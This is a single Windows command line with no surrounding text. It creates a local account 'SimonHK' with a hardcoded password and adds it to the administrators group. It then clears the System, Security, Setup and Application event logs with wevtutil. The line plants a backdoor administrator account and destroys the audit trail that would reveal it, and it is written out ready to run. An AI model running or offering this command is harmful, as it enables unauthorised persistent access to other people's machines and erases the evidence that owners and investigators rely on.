net user /add SimonHK passA-JHG123 && net localgroup administrators SimonHK /add && wevtutil.exe cl System && wevtutil cl Security && wevtutil.exe cl Setup && wevtutil.exe cl Application
